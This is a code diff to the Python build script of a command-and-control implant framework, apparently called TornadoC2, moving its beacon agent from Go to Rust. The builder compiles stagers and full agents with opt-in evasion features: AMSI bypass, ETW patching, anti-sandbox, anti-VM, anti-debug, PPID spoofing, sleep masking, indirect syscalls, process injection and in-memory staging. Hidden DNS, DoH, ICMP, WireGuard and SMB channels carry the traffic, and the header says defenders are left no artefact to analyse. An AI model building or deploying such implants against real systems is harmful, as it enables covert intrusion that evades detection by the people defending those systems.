@@ -1,12 +1,17 @@
-"""Cross-compilation of the Go beacon agent.
+"""Cross-compilation of the Rust beacon agent.
 
-Every behavioural property is set at build time via linker flags. There
-is no runtime configuration file, no environment variable parsing, no
-on-disk artefact that a defender can retrieve and analyse. The binary
-you build is the binary that runs.
+Every behavioural property is set at build time via `TC2_*` environment
+variables consumed by `agent/build.rs`, which emits them as `pub const`
+items in `config_generated.rs`. There is no runtime configuration file,
+no environment variable parsing, no on-disk artefact that a defender
+can retrieve and analyse. The binary you build is the binary that runs.
 
 Evasion features are opt-in flags on BeaconBuildConfig. Named OPSEC
 profiles bundle common combinations.
+
+Size-sensitive features are opt-in flags on BeaconBuildConfig and are
+implemented as Cargo features rather than `TC2_*` env vars, because
+they gate whether a dependency is compiled at all
 
 SMB and TCP pivot builds additionally require an engagement-wide
 ECDSA P-256 keypair, supplied as a PEM file containing both halves.
@@ -23,8 +28,7 @@ import os
 import shutil
 import subprocess
 from dataclasses import dataclass
-from typing import List, Optional
-
+from typing import Dict, List, Optional
 
 # ---------------------------------------------------------------------
 # Configuration
@@ -79,7 +83,7 @@ class BeaconBuildConfig:
     identity_role:   str = ''
     work_hours_start: str = '08:00'
     work_hours_end:   str = '19:00'
-    tls_profile: str = 'go'
+    tls_profile: str = 'rustls'
     target_os:     str = 'linux'
     target_arch:   str = 'amd64'
     output_format: str = 'exe'
@@ -95,6 +99,7 @@ class BeaconBuildConfig:
     antidebug:          bool = False
     antivm:             bool = False
     verbose:            bool = False
+    wasm_extensions:    bool = False
     agent_keypair_path: str = ''
     server_ecdh_pubkey_b64: str = ''
     stage_key_hex: str = ''
@@ -207,8 +212,8 @@ def _read_pivot_pem(path: str) -> tuple:
     """Read a pivot PEM file and return (priv_b64, pub_b64).
 
     Both values are standard base64 of the raw DER bytes, which is
-    exactly the encoding the agent's -X main.PivotPrivKeyB64 and
-    -X main.PivotPubKeyB64 expect. A PEM body is already standard
+    exactly the encoding the agent's TC2_PIVOT_PRIV_KEY_B64 and
+    TC2_PIVOT_PUB_KEY_B64 expect. A PEM body is already standard
     base64 of the DER, so the extraction is a line-join, not a
     decode-reencode.
 
@@ -372,7 +377,7 @@ class BeaconBuilder:
         self._assert_toolchain()
 
     def _find_agent_dir(self) -> str:
-        """Locate the Go module directory by searching for go.mod.
+        """Locate the Rust crate directory by searching for Cargo.toml.
 
         Candidates, in order:
 
@@ -380,7 +385,7 @@ class BeaconBuilder:
           2. <repo>/agent             — agent at the repo root
           3. <repo>/tornadoc2/agent   — agent inside a nested package
 
-        The first candidate whose directory contains go.mod wins. If
+        The first candidate whose directory contains Cargo.toml wins. If
         none match, the primary candidate is returned so the error
         from _assert_toolchain names a specific path.
         """
@@ -391,7 +396,7 @@ class BeaconBuilder:
             os.path.join(self.repo_root, 'tornadoc2', 'agent'),
         ]
         for candidate in candidates:
-            if os.path.isfile(os.path.join(candidate, 'go.mod')):
+            if os.path.isfile(os.path.join(candidate, 'Cargo.toml')):
                 return candidate
         return candidates[0]
 
@@ -400,6 +405,14 @@ class BeaconBuilder:
         """Compile the beacon. Returns the output path."""
 
         os.makedirs(self.output_dir, exist_ok=True)
+
+        if getattr(config, 'wasm_extensions', False) and \
+                config.output_format == 'stager':
+            raise RuntimeError(
+                "wasm_extensions=True is not supported on a stager "
+                "build. The stager is a minimal first stage with no "
+                "extension host. Leave wasm_extensions=False for the "
+                "stager, and enable it on the full agent it fetches.")
 
         if getattr(config, 'inject', False):
             if config.target_os == 'windows':
@@ -427,13 +440,23 @@ class BeaconBuilder:
                   "an existing session will be rejected as an "
                   "impersonation attempt. Set agent_keypair_path to a "
                   "stable file to make rebuilds idempotent.")
+        if getattr(config, 'wasm_extensions', False):
+            print("[build] note: wasm_extensions=True — the WASM "
+                  "extension host and its interpreter are compiled "
+                  "into this binary. Expect ~1 MB additional size "
+                  "with wasmi, or 3–7 MB with wasmtime. Leave "
+                  "wasm_extensions=False (the default) for a build "
+                  "with no runtime-loadable extensions. The extension "
+                  "verbs will be absent from the target's catalogue "
+                  "either way, unless wasm_extensions is True.")
         out = os.path.join(self.output_dir, self._output_name(config))
 
         env = self._build_env(config)
-        ldflags = self._build_ldflags(config, profile)
+        env.update(self._build_env_vars(config, profile))
 
-        cmd = self._build_command(config, ldflags, out)
+        cmd = self._build_command(config)
         subprocess.run(cmd, env=env, cwd=self.agent_dir, check=True)
+        self._copy_artifact(config, out)
 
         self._last_build_injected = False
         if getattr(config, 'inject', False):
@@ -465,92 +488,139 @@ class BeaconBuilder:
     # ------------------------------------------------------------------
 
     def _assert_toolchain(self) -> None:
-        if shutil.which('go') is None:
-            raise RuntimeError('go toolchain not found on PATH')
-        gomod = os.path.join(self.agent_dir, 'go.mod')
-        if not os.path.isfile(gomod):
+        if shutil.which('cargo') is None or shutil.which('rustc') is None:
+            raise RuntimeError(
+                'cargo/rustc toolchain not found on PATH. '
+                'Install rustup: https://rustup.rs')
+        cargotoml = os.path.join(self.agent_dir, 'Cargo.toml')
+        if not os.path.isfile(cargotoml):
             pkg_dir = os.path.dirname(os.path.abspath(self.source_dir))
             raise RuntimeError(
-                f'go.mod not found. Checked:\n'
+                f'Cargo.toml not found. Checked:\n'
                 f'  {os.path.join(pkg_dir, "agent")}\n'
                 f'  {os.path.join(self.repo_root, "agent")}\n'
                 f'  {os.path.join(self.repo_root, "tornadoc2", "agent")}\n'
-                f'Place go.mod in one of these directories, or pass '
+                f'Place Cargo.toml in one of these directories, or pass '
                 f'agent_dir=<path> to BeaconBuilder().'
             )
 
     def _build_env(self, cfg: BeaconBuildConfig) -> dict:
+        """Base build environment for cargo/rustc itself.
+
+        The TC2_* configuration vars are merged in by build() after this
+        returns. This function only handles what cargo and rustc need.
+        """
         env = os.environ.copy()
 
-        _CONTAMINATION_VARS = (
-            'GOAMD64',       # amd64 microarchitecture level
-            'GOARM64',       # arm64 microarchitecture level
-            'GOARM',         # 32-bit ARM FPU version
-            'GOMIPS',        # MIPS FPU
-            'GOMIPS64',      # MIPS64 FPU
-            'GOPPC64',       # PowerPC ISA level
-            'GO386',         # 386 FPU (SSE2 vs softfloat)
-            'GOWASM',        # WebAssembly feature set
-            'GOEXPERIMENT',  # compiler experiment set
-            'GOFLAGS',       # arbitrary user flags
-        )
-        _leaked = [v for v in _CONTAMINATION_VARS if v in env]
-        if _leaked:
-            print(f"[build] scrubbing inherited env vars that "
-                  f"alter the target binary: "
-                  f"{', '.join(_leaked)}")
-        for var in _CONTAMINATION_VARS:
+        rustflags = env.get('RUSTFLAGS', '').strip()
+        if rustflags:
+            rustflags += ' '
+        rustflags += f'--remap-path-prefix={self.agent_dir}=.'
+        env['RUSTFLAGS'] = rustflags
+
+        env['CARGO_TARGET_DIR'] = os.path.join(self.agent_dir, 'target')
+
+        for var in ('GOOS', 'GOARCH', 'GOAMD64', 'GOARM64', 'GOARM',
+                    'GOMIPS', 'GOMIPS64', 'GOPPC64', 'GO386', 'GOWASM',
+                    'GOEXPERIMENT', 'GOFLAGS', 'CGO_ENABLED'):
             env.pop(var, None)
-
-        env['GOOS'] = cfg.target_os
-        env['GOARCH'] = cfg.target_arch
-
-        if cfg.output_format == 'dll':
-            env['CGO_ENABLED'] = '1'
-        else:
-            env['CGO_ENABLED'] = '0'
-
-        if cfg.target_arch == 'amd64':
-            env['GOAMD64'] = 'v1'
-        elif cfg.target_arch == 'arm64':
-            env['GOARM64'] = 'v8.0'
 
         return env
 
-    def _build_command(self, cfg: BeaconBuildConfig,
-                       ldflags: List[str], out: str) -> List[str]:
-        all_flags = ['-s', '-w'] + list(ldflags)
-        target = './stager' if cfg.output_format == 'stager' else './stageless'
-        buildmode: List[str] = []
+    def _build_command(self, cfg: BeaconBuildConfig) -> List[str]:
+        """Build the cargo invocation for this configuration.
+
+        cargo writes the artifact to
+        <CARGO_TARGET_DIR>/<triple>/release/<bin>. The caller copies
+        that to the user-visible output path via _copy_artifact().
+
+        Two Cargo features are the mechanism for the build-time size
+        trades this builder exposes. Both are opt-in, because both
+        pull in dependencies that a lean build can skip entirely:
+
+          * `dll`         — set when output_format == 'dll'.
+                             `Cargo.toml` ships
+                             crate-type = ["rlib", "cdylib"]
+                             unconditionally, so this feature gates
+                             only the DllMain export in lib.rs.
+                             Without it, the DLL target compiles but
+                             has no entry point. (This was a bug in
+                             the previous version of this method:
+                             the `--features dll` flag was never
+                             appended, so DLL builds produced a
+                             cdylib with no exported DllMain.)
+
+          * `wasm-host`   — set when wasm_extensions is True.
+                             Pulls in the WASM extension host and
+                             the wasmi interpreter. Off by default
+                             because the interpreter is the single
+                             largest optional dependency. An agent
+                             without this feature has no `extension`
+                             verbs and no interpreter, and its
+                             binary does not link wasmi at all.
+        """
         if cfg.output_format == 'dll':
             if cfg.target_os != 'windows':
                 raise RuntimeError(
                     "output_format='dll' requires target_os='windows'")
-            if (shutil.which('gcc') is None
-                    and shutil.which('x86_64-w64-mingw32-gcc') is None):
-                raise RuntimeError(
-                    "output_format='dll' uses -buildmode=c-shared, "
-                    "which requires a C compiler on PATH.\n"
-                    "  Linux → Windows:  apt install gcc-mingw-w64-x86-64\n"
-                    "  Windows native:   install MinGW-w64 or MSVC Build Tools")
-            buildmode = ['-buildmode=c-shared']
-        go = ['go', 'build', '-trimpath'] + buildmode + [
-              '-ldflags', ' '.join(all_flags),
-              '-o', out, target]
-        if cfg.garble:
-            if shutil.which('garble') is None:
-                raise RuntimeError(
-                    'garble requested but not on PATH. Install with:\n'
-                    '    go install mvdan.cc/garble@v0.17.0')
-            go = ['garble', '-literals', '-tiny'] + go[1:]
-        return go
 
-    def _build_ldflags(self, cfg: BeaconBuildConfig,
-                       profile: Optional[dict]) -> List[str]:
+        bin_name = 'stager' if cfg.output_format == 'stager' else 'beacon'
+        features: List[str] = []
+        if cfg.output_format == 'dll':
+            features.append('dll')
+        if getattr(cfg, 'wasm_extensions', False):
+            features.append('wasm-host')
+
+        cmd = [
+            'cargo', 'build',
+            '--release',
+            '--target', self._rust_triple(cfg),
+            '--bin', bin_name,
+        ]
+        if features:
+            cmd.extend(['--features', ','.join(features)])
+        return cmd
+
+    def _rust_triple(self, cfg: BeaconBuildConfig) -> str:
+        """Map (target_os, target_arch) to a Rust target triple."""
+        triple = {
+            ('linux',   'amd64'): 'x86_64-unknown-linux-gnu',
+            ('linux',   'arm64'): 'aarch64-unknown-linux-gnu',
+            ('windows', 'amd64'): 'x86_64-pc-windows-gnu',
+            ('windows', '386'):   'i686-pc-windows-gnu',
+            ('windows', 'arm64'): 'aarch64-pc-windows-msvc',
+        }.get((cfg.target_os, cfg.target_arch))
+        if triple is None:
+            raise RuntimeError(
+                f'unsupported target {cfg.target_os}/{cfg.target_arch}; '
+                f'valid combinations: '
+                f'linux/amd64, linux/arm64, windows/amd64, '
+                f'windows/386, windows/arm64')
+        return triple
+
+    def _target_dir(self, cfg: BeaconBuildConfig) -> str:
+        """Return agent/target/<triple> — where cargo writes the binary."""
+        return os.path.join(
+            self.agent_dir, 'target', self._rust_triple(cfg))
+
+    def _copy_artifact(self, cfg: BeaconBuildConfig, out: str) -> None:
+        """Copy the cargo-produced binary to the user-visible path."""
+        bin_name = 'stager' if cfg.output_format == 'stager' else 'beacon'
+        suffix = '.exe' if cfg.target_os == 'windows' else ''
+        src = os.path.join(
+            self._target_dir(cfg), 'release', bin_name + suffix)
+        if not os.path.exists(src):
+            raise RuntimeError(
+                f'cargo did not produce {src}. Check the cargo '
+                f'build output above for the actual error.')
+        shutil.copy2(src, out)
+
+    def _build_env_vars(self, cfg: BeaconBuildConfig,
+                        profile: Optional[dict]) -> Dict[str, str]:
         import base64 as _b64
 
         if cfg.output_format == 'stager':
-            return self._build_stager_ldflags(cfg, profile)
+            return self._build_stager_env_vars(cfg, profile)
 
         def _read_pem(path: str) -> str:
             if not path:
@@ -575,16 +645,16 @@ class BeaconBuilder:
                           for i, b in enumerate(raw))
             return _b64.b64encode(xored).decode('ascii')
 
-        flags = [
-            f"-X main.ObfKeyHex={obf_key.hex()}",
-            f"-X main.DefaultURL={_obf(cfg.url)}",
-            f"-X main.DefaultProfile={cfg.profile_name}",
-            f"-X main.KillDaysRaw={cfg.kill_days}",
-            f"-X main.WorkHoursStartRaw={cfg.work_hours_start}",
-            f"-X main.WorkHoursEndRaw={cfg.work_hours_end}",
-            f"-X main.TLSProfile={cfg.tls_profile}",
-            f"-X main.VerboseRaw={'true' if getattr(cfg, 'verbose', False) else 'false'}",
-        ]
+        env: Dict[str, str] = {
+            'TC2_OBF_KEY_HEX':      obf_key.hex(),
+            'TC2_DEFAULT_URL':      _obf(cfg.url),
+            'TC2_DEFAULT_PROFILE':  cfg.profile_name,
+            'TC2_KILL_DAYS':        str(cfg.kill_days),
+            'TC2_WORK_HOURS_START': cfg.work_hours_start,
+            'TC2_WORK_HOURS_END':   cfg.work_hours_end,
+            'TC2_TLS_PROFILE':      cfg.tls_profile,
+            'TC2_VERBOSE':          'true' if getattr(cfg, 'verbose', False) else 'false',
+        }
 
         if profile is not None:
             merged = dict(profile)
@@ -608,42 +678,42 @@ class BeaconBuilder:
                         '\nFix the profile or remove the shaping '
                         'block before building.')
 
-            flags.append(f"-X main.ProfileJSON={_obf(json.dumps(merged))}")
+            env['TC2_PROFILE_JSON'] = _obf(json.dumps(merged))
         if server_pubkey_pem:
             encoded = _b64.b64encode(
                 server_pubkey_pem.encode('utf-8')
             ).decode('ascii')
-            flags.append(f"-X main.ServerPubKeyPem={encoded}")
+            env['TC2_SERVER_PUBKEY_PEM'] = encoded
         if client_cert_pem:
             encoded = _b64.b64encode(
                 client_cert_pem.encode('utf-8')
             ).decode('ascii')
-            flags.append(f"-X main.ClientCertPem={encoded}")
+            env['TC2_CLIENT_CERT_PEM'] = encoded
         if client_key_pem:
             encoded = _b64.b64encode(
                 client_key_pem.encode('utf-8')
             ).decode('ascii')
-            flags.append(f"-X main.ClientKeyPem={encoded}")
+            env['TC2_CLIENT_KEY_PEM'] = encoded
         if root_ca_pem:
             encoded = _b64.b64encode(
                 root_ca_pem.encode('utf-8')
             ).decode('ascii')
-            flags.append(f"-X main.RootCAPem={encoded}")
-        for name, value in (
-            ('AntiSandboxEnabledRaw', cfg.antisanbox),
-            ('AmsiBypassRaw',         cfg.amsi_bypass),
-            ('EtwPatchRaw',           cfg.etw_patch),
-            ('SleepMaskEnabledRaw',   cfg.sleep_mask not in ('', 'none')),
-            ('StringObfuscationRaw',  cfg.string_obfuscation),
-            ('PpidSpoofRaw',          cfg.ppid_spoof),
-            ('AntiDebugRaw',          cfg.antidebug),
-            ('AntiVmRaw',             cfg.antivm),
+            env['TC2_ROOT_CA_PEM'] = encoded
+        for env_key, value in (
+            ('TC2_ANTISANDBOX',        cfg.antisanbox),
+            ('TC2_AMSI_BYPASS',        cfg.amsi_bypass),
+            ('TC2_ETW_PATCH',          cfg.etw_patch),
+            ('TC2_SLEEP_MASK_ENABLED', cfg.sleep_mask not in ('', 'none')),
+            ('TC2_STRING_OBFUSCATION', cfg.string_obfuscation),
+            ('TC2_PPID_SPOOF',         cfg.ppid_spoof),
+            ('TC2_ANTIDEBUG',          cfg.antidebug),
+            ('TC2_ANTIVM',             cfg.antivm),
         ):
-            flags.append(f"-X main.{name}={'true' if value else 'false'}")
+            env[env_key] = 'true' if value else 'false'
 
-        flags.append(f"-X main.SleepMaskType={cfg.sleep_mask}")
+        env['TC2_SLEEP_MASK_TYPE'] = cfg.sleep_mask
 
-        flags.append(f"-X main.SyscallMethod={cfg.syscall_method}")
+        env['TC2_SYSCALL_METHOD'] = cfg.syscall_method
 
         modes = [
             m.strip().lower()
@@ -670,8 +740,7 @@ class BeaconBuilder:
         # this flag's existence.
         identity_role = _default_identity_role(cfg)
         if identity_role:
-            flags.append(
-                f"-X main.IdentityRole={identity_role}")
+            env['TC2_IDENTITY_ROLE'] = identity_role
 
         _VALID_SLEEP_MASKS = ('', 'none', 'rc4', 'aes-ctr',
                               'cronos', 'hwbp')
@@ -704,10 +773,13 @@ class BeaconBuilder:
                 f"syscall_method='indirect' is Windows-only; "
                 f"got target_os={cfg.target_os!r}. Use "
                 f"'direct' or leave the field at its default.")
-        if cfg.tls_profile not in ('go', 'chrome', 'firefox', 'safari'):
+        if cfg.tls_profile not in ('go', 'rustls', 'chrome',
+                                   'firefox', 'safari'):
             raise RuntimeError(
-                f"tls_profile must be one of 'go', 'chrome', "
-                f"'firefox', 'safari'; got {cfg.tls_profile!r}")
+                f"tls_profile must be one of 'rustls', 'chrome', "
+                f"'firefox', 'safari' ('go' is accepted as a "
+                f"deprecated alias for 'rustls'); got "
+                f"{cfg.tls_profile!r}")
 
         if ('http' in modes or 'quic' in modes) and not cfg.url:
             raise RuntimeError(
@@ -815,50 +887,35 @@ class BeaconBuilder:
                     "transport_mode 'wireguard' requires "
                     "wireguard_tunnel_ip (e.g. 10.99.0.2)")
 
-        flags.append(
-            f"-X main.TransportMode={','.join(modes)}")
+        env['TC2_TRANSPORT_MODE'] = ','.join(modes)
 
         if 'websocket' in modes:
-            flags.append(
-                f"-X main.WebSocketURL={_obf(cfg.url)}")
+            env['TC2_WEBSOCKET_URL'] = _obf(cfg.url)
 
         if 'wireguard' in modes:
-            flags.append(
-                f"-X main.WireGuardServerPubKey="
-                f"{cfg.wireguard_server_pubkey}")
-            flags.append(
-                f"-X main.WireGuardServerAddr="
-                f"{cfg.wireguard_server_addr}")
-            flags.append(
-                f"-X main.WireGuardAgentPrivKey="
-                f"{cfg.wireguard_agent_privkey}")
-            flags.append(
-                f"-X main.WireGuardTunnelIP="
-                f"{cfg.wireguard_tunnel_ip}")
+            env['TC2_WIREGUARD_SERVER_PUBKEY'] = cfg.wireguard_server_pubkey
+            env['TC2_WIREGUARD_SERVER_ADDR'] = cfg.wireguard_server_addr
+            env['TC2_WIREGUARD_AGENT_PRIVKEY'] = cfg.wireguard_agent_privkey
+            env['TC2_WIREGUARD_TUNNEL_IP'] = cfg.wireguard_tunnel_ip
 
             inner_port = (getattr(cfg, 'wireguard_inner_port', '')
                           or '8881')
-            flags.append(
-                f"-X main.WireGuardInnerPort={inner_port}")
+            env['TC2_WIREGUARD_INNER_PORT'] = inner_port
                 
             server_tunnel_ip = (getattr(
                 cfg, 'wireguard_server_tunnel_ip', '')
                 or '10.99.0.1')
-            flags.append(
-                f"-X main.WireGuardServerTunnelIP="
-                f"{server_tunnel_ip}")
+            env['TC2_WIREGUARD_SERVER_TUNNEL_IP'] = server_tunnel_ip
 
         if getattr(cfg, 'smb_pipe', ''):
             if cfg.target_os != 'windows':
                 raise RuntimeError(
                     "smb_pipe requires target_os=windows")
-            flags.append(f"-X main.SMBPipe={cfg.smb_pipe}")
+            env['TC2_SMB_PIPE'] = cfg.smb_pipe
 
         if getattr(cfg, 'tcp_bind_addr', ''):
-            flags.append(
-                f"-X main.TCPBindAddr={cfg.tcp_bind_addr}")
-            flags.append(
-                f"-X main.TCPBindToken={cfg.tcp_bind_token}")
+            env['TC2_TCP_BIND_ADDR'] = cfg.tcp_bind_addr
+            env['TC2_TCP_BIND_TOKEN'] = cfg.tcp_bind_token
 
         if getattr(cfg, 'tcp_rev_listen', ''):
             if not getattr(cfg, 'tcp_rev_token', ''):
@@ -873,10 +930,8 @@ class BeaconBuilder:
             except ValueError:
                 raise RuntimeError(
                     "tcp_rev_token must be valid hex")
-            flags.append(
-                f"-X main.TCPRevListen={cfg.tcp_rev_listen}")
-            flags.append(
-                f"-X main.TCPRevToken={cfg.tcp_rev_token}")
+            env['TC2_TCP_REV_LISTEN'] = cfg.tcp_rev_listen
+            env['TC2_TCP_REV_TOKEN'] = cfg.tcp_rev_token
 
         if getattr(cfg, 'tcp_rev_target', ''):
             if not getattr(cfg, 'tcp_rev_token', ''):
@@ -891,10 +946,8 @@ class BeaconBuilder:
             except ValueError:
                 raise RuntimeError(
                     "tcp_rev_token must be valid hex")
-            flags.append(
-                f"-X main.TCPRevTarget={cfg.tcp_rev_target}")
-            flags.append(
-                f"-X main.TCPRevToken={cfg.tcp_rev_token}")
+            env['TC2_TCP_REV_TARGET'] = cfg.tcp_rev_target
+            env['TC2_TCP_REV_TOKEN'] = cfg.tcp_rev_token
 
         if getattr(cfg, 'smb_relay_pipe', ''):  
             if cfg.target_os != 'windows':
@@ -908,8 +961,7 @@ class BeaconBuilder:
                     f"[A-Za-z0-9._-]+; got "
                     f"{cfg.smb_relay_pipe!r}. A bare pipe name "
                     f"only — no path prefix, no UNC form.")
-            flags.append(
-                f"-X main.SMBRelayPipe={cfg.smb_relay_pipe}")
+            env['TC2_SMB_RELAY_PIPE'] = cfg.smb_relay_pipe
 
         if getattr(cfg, 'tcp_relay_target', ''):
             if not getattr(cfg, 'tcp_relay_token', ''):
@@ -924,10 +976,8 @@ class BeaconBuilder:
             except ValueError:
                 raise RuntimeError(
                     "tcp_relay_token must be valid hex")
-            flags.append(
-                f"-X main.TCPRelayTarget={cfg.tcp_relay_target}")
-            flags.append(
-                f"-X main.TCPRelayToken={cfg.tcp_relay_token}")
+            env['TC2_TCP_RELAY_TARGET'] = cfg.tcp_relay_target
+            env['TC2_TCP_RELAY_TOKEN'] = cfg.tcp_relay_token
 
         is_parent = bool(
             getattr(cfg, 'smb_relay_pipe', '') or
@@ -961,8 +1011,7 @@ class BeaconBuilder:
                         f"pivot listener and needs the private "
                         f"half. Regenerate the file with "
                         f"`--pivot-key-gen`.")
-                flags.append(
-                    f"-X main.PivotPrivKeyB64={priv_b64}")
+                env['TC2_PIVOT_PRIV_KEY_B64'] = priv_b64
             if is_child:
                 if not pub_b64:
                     raise RuntimeError(
@@ -971,15 +1020,13 @@ class BeaconBuilder:
                         f"pivot client and needs the public half. "
                         f"Regenerate the file with "
                         f"`--pivot-key-gen`.")
-                flags.append(
-                    f"-X main.PivotPubKeyB64={pub_b64}")
+                env['TC2_PIVOT_PUB_KEY_B64'] = pub_b64
 
         ecdh_pubkey = cfg.server_ecdh_pubkey_b64
 
         failover = max(0, int(getattr(
             cfg, 'transport_failover_after', 3)))
-        flags.append(
-            f"-X main.TransportFailoverAfterRaw={failover}")
+        env['TC2_TRANSPORT_FAILOVER_AFTER'] = str(failover)
 
         if 'dns' in modes or 'doh' in modes:
             if not cfg.dns_domain:
@@ -987,27 +1034,25 @@ class BeaconBuilder:
                     f"transport_mode includes "
                     f"{'dns' if 'dns' in modes else 'doh'} but "
                     f"dns_domain is empty")
-            flags.append(f"-X main.DNSDomain={cfg.dns_domain}")
+            env['TC2_DNS_DOMAIN'] = cfg.dns_domain
 
             if profile is not None:
                 dns_label = profile.get('dns_label') or {}
                 if isinstance(dns_label, dict):
-                    for flag_name, key in (
-                        ('DNSVerbB',            'verb_b'),
-                        ('DNSVerbT',            'verb_t'),
-                        ('DNSVerbR',            'verb_r'),
-                        ('DNSPayloadChunkSize', 'payload_chunk_size'),
+                    for env_key, key in (
+                        ('TC2_DNS_VERB_B',             'verb_b'),
+                        ('TC2_DNS_VERB_T',             'verb_t'),
+                        ('TC2_DNS_VERB_R',             'verb_r'),
+                        ('TC2_DNS_PAYLOAD_CHUNK_SIZE', 'payload_chunk_size'),
                     ):
                         val = dns_label.get(key)
                         if val is None:
                             continue
 
-                        flags.append(
-                            f"-X main.{flag_name}={val}")
+                        env[env_key] = str(val)
 
         if 'dns' in modes and cfg.dns_resolver:
-            flags.append(
-                f"-X main.DNSResolver={cfg.dns_resolver}")
+            env['TC2_DNS_RESOLVER'] = cfg.dns_resolver
 
         if 'icmp' in modes:
             if cfg.target_os == 'windows':
@@ -1018,45 +1063,33 @@ class BeaconBuilder:
                 raise RuntimeError(
                     "transport_mode includes 'icmp' but icmp_host "
                     "is empty (set it to the C2's public IPv4)")
-            flags.append(
-                f"-X main.ICMPHost={_obf(cfg.icmp_host)}")
+            env['TC2_ICMP_HOST'] = _obf(cfg.icmp_host)
 
         if 'doh' in modes:
             if cfg.doh_resolver:
-                flags.append(
-                    f"-X main.DoHResolver={_obf(cfg.doh_resolver)}")
+                env['TC2_DOH_RESOLVER'] = _obf(cfg.doh_resolver)
             if cfg.doh_host_header:
-                flags.append(
-                    f"-X main.DoHHostHeader="
-                    f"{_obf(cfg.doh_host_header)}")
+                env['TC2_DOH_HOST_HEADER'] = _obf(cfg.doh_host_header)
             if cfg.doh_user_agent:
-                flags.append(
-                    f"-X main.DoHUserAgent="
-                    f"{_obf(cfg.doh_user_agent)}")
+                env['TC2_DOH_USER_AGENT'] = _obf(cfg.doh_user_agent)
 
         priv_pem = self._ensure_agent_keypair(cfg)
         if priv_pem:
             encoded = _b64.b64encode(
                 priv_pem.encode('utf-8')).decode('ascii')
-            flags.append(f"-X main.AgentPrivKeyPem={encoded}")
+            env['TC2_AGENT_PRIV_KEY_PEM'] = encoded
 
         if ecdh_pubkey:
-            flags.append(
-                f"-X main.ServerECDHPubkey={ecdh_pubkey}")
-
-        if getattr(cfg, 'injector_shellcode_b64', ''):
-            flags.append(
-                f"-X main.InjectorShellcodeB64="
-                f"{cfg.injector_shellcode_b64}")
+            env['TC2_SERVER_ECDH_PUBKEY'] = ecdh_pubkey
 
         # inject_method is the build-time default for `migrate
         # <pid>` when the operator does not supply --method. It is
         # emitted unconditionally, including on a build with
-        # inject=False, so the linker default in
-        # agent/stageless/ldflags.go is always overridden by the
-        # explicit build config. The runtime refuses `migrate <pid>`
-        # on a non-injecting build with the "no injector shellcode"
-        # message regardless of which method the flag named.
+        # inject=False, so the default in `agent/src/config.rs` is
+        # always overridden by the explicit build config. The
+        # runtime refuses `migrate <pid>` on a non-injecting build
+        # with the "no injector shellcode" message regardless of
+        # which method was named.
         inject_method = (
             getattr(cfg, 'inject_method', '') or 'default')
         if inject_method not in ('default', 'apc',
@@ -1095,19 +1128,18 @@ class BeaconBuilder:
                     "inject=True there is no shellcode to queue. "
                     "Set inject=True, or leave inject_method at "
                     "'default'.")
-        flags.append(
-            f"-X main.InjectMethodDefault={inject_method}")
+        env['TC2_INJECT_METHOD_DEFAULT'] = inject_method
 
-        return flags
+        return env
 
-    def _build_stager_ldflags(self, cfg: BeaconBuildConfig,
-                              profile: Optional[dict] = None) -> List[str]:
-        """Linker flags for a stager build.
+    def _build_stager_env_vars(self, cfg: BeaconBuildConfig,
+                               profile: Optional[dict] = None) -> Dict[str, str]:
+        """Build-time configuration env vars for a stager build.
 
         The stager is a minimal first-stage implant. It has no
         signing key, no CA, no evasion — its only jobs are check-in,
-        fetch the full agent, and execute it in memory. The flag set
-        is therefore much smaller than the full agent's.
+        fetch the full agent, and execute it in memory. The env var
+        set is therefore much smaller than the full agent's.
         """
         import secrets as _secrets
         import base64 as _b64
@@ -1147,23 +1179,22 @@ class BeaconBuilder:
                 f"dns, doh, icmp, smb, or tcp, and stage it "
                 f"separately.")
 
-        flags = [
-            f"-X main.ObfKeyHex={obf_key.hex()}",
-            f"-X main.DefaultURL={_obf(cfg.url)}",
-            f"-X main.KillDaysRaw={cfg.kill_days}",
-            f"-X main.DefaultSleepRaw=5",
-            f"-X main.StageName={_obf(stage_name)}",
-            f"-X main.TLSProfile={cfg.tls_profile}",
-            f"-X main.WorkHoursStartRaw={cfg.work_hours_start}",
-            f"-X main.WorkHoursEndRaw={cfg.work_hours_end}",
-            f"-X main.ServerECDHPubkey={cfg.server_ecdh_pubkey_b64}",
-        ]
+        env: Dict[str, str] = {
+            'TC2_OBF_KEY_HEX':        obf_key.hex(),
+            'TC2_DEFAULT_URL':        _obf(cfg.url),
+            'TC2_KILL_DAYS':          str(cfg.kill_days),
+            'TC2_DEFAULT_SLEEP':      '5',
+            'TC2_STAGE_NAME':         _obf(stage_name),
+            'TC2_TLS_PROFILE':        cfg.tls_profile,
+            'TC2_WORK_HOURS_START':   cfg.work_hours_start,
+            'TC2_WORK_HOURS_END':     cfg.work_hours_end,
+            'TC2_SERVER_ECDH_PUBKEY': cfg.server_ecdh_pubkey_b64,
+        }
 
         stager_identity_role = (
             getattr(cfg, 'identity_role', '') or '').strip()
         if stager_identity_role:
-            flags.append(
-                f"-X main.IdentityRole={stager_identity_role}")
+            env['TC2_IDENTITY_ROLE'] = stager_identity_role
 
         if profile is not None:
             if profile.get('shaping'):
@@ -1179,21 +1210,18 @@ class BeaconBuilder:
                 c2 = merged.get('c2') or {}
                 if key in c2:
                     merged[key] = c2[key]
-            flags.append(
-                f"-X main.ProfileJSON={_obf(json.dumps(merged))}")
+            env['TC2_PROFILE_JSON'] = _obf(json.dumps(merged))
 
         key_hex = getattr(cfg, 'stage_key_hex', '') or \
             _secrets.token_bytes(32).hex()
-        flags.append(f"-X main.StageKeyHex={key_hex}")
+        env['TC2_STAGE_KEY_HEX'] = key_hex
         self._write_stage_key(stage_name, key_hex)
 
         if cfg.server_pubkey_path:
             try:
                 with open(cfg.server_pubkey_path, 'rb') as fh:
                     pem_bytes = fh.read()
-                flags.append(
-                    f"-X main.ServerPubKeyPem="
-                    f"{_b64.b64encode(pem_bytes).decode('ascii')}")
+                env['TC2_SERVER_PUBKEY_PEM'] = _b64.b64encode(pem_bytes).decode('ascii')
             except OSError as exc:
                 print(f"[build] warning: cannot read server pubkey "
                       f"at {cfg.server_pubkey_path}: {exc} — the "
@@ -1208,16 +1236,14 @@ class BeaconBuilder:
             try:
                 with open(cfg.root_ca_path, 'rb') as fh:
                     pem = fh.read()
-                flags.append(
-                    f"-X main.RootCAPem="
-                    f"{_b64.b64encode(pem).decode('ascii')}")
+                env['TC2_ROOT_CA_PEM'] = _b64.b64encode(pem).decode('ascii')
             except OSError:
                 pass
 
         if cfg.verbose:
-            flags.append(f"-X main.VerboseRaw=true")
+            env['TC2_VERBOSE'] = 'true'
 
-        return flags
+        return env
 
     def _write_stage_key(self, name: str, key_hex: str) -> None:
         """Record the AES-256 key a stager was built with.
